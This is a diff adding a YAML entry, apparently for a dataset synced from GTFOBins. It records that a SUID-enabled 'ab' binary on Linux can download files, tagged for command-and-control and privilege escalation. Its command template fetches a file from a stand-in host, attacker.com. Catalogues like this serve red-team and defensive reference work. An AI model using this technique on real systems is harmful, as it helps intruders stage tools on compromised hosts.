@@ -1,0 +1,24 @@
+id: gtfobins/ab/download/suid
+type: binary
+platform: linux
+name: ab
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: ab -v2 http://attacker.com/path/to/input-file
+references:
+- https://gtfobins.github.io/gtfobins/ab/
+tags:
+- linux
+- unix
+- gtfobins
